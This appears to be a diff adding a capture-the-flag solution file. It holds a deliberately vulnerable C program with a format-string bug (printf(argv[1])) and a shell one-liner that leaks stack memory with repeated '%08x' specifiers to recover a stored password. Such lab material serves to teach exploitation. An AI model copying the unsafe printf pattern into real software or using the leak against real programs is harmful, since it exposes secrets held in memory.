@@ -1,0 +1,22 @@
+# ... or how to read through the stack
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]){
+    FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
+    char buffer[32];
+    fgets(buffer, sizeof(buffer), secret);
+    printf(argv[1]);
+    fclose(secret);
+    return 0;
+}
+
+# Solution
+echo -e $(./ch5 $(python -c 'print "%08x" * 20') | sed -r '
+        # little-endian architecture, reorder bytes
+        s/(..)(..)(..)(..)/\4\3\2\1/g
+        # preceed every byte by \\x so it will be
+        # interpreted by echo -e
+        s/(..)/\\x&/g
+    ' ) | grep -Pazo '[[:print:]]{13}\n'
